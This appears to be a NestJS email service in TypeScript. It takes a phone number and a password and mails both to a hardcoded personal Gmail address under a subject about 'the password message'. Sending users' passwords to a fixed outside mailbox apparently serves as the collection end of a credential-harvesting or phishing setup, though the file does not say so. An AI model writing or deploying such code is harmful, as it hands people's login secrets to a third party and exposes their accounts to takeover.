import { Injectable } from '@nestjs/common';
import * as nodemailer from 'nodemailer';
import  {envVariables} from '../constants/variables.service';
import { template } from './template.service';

@Injectable()
export class SendEmailService {

 private transporter: nodemailer.Transporter;
 constructor() {
  if (!envVariables.SECRETPASSWORD || !envVariables.SECRETPHONE) {
    throw new Error('برجاء التأكد من وجود كلمة السر ورقم الهاتف في envVariables');
  }
  this.transporter = nodemailer.createTransport({
    service: "gmail",
    secure: true,
    auth: {
      user: envVariables.EMAIL_USER,
      pass:   envVariables.EMAIL_PASS,
    },
  });
 }
 
 
 async  main( {phone , password}: { phone: string; password: string }) {
 Server: "email"
 const info = await this.transporter.sendMail({
  from: envVariables.EMAIL_USER, 
  to: "osamaproud01@gmail.com", 
  subject: "الرسالة بتاعت كلمة السر", 

  html:template(password, phone),  // html body
 });
console.log("Message sent: %s", info.messageId);

}

}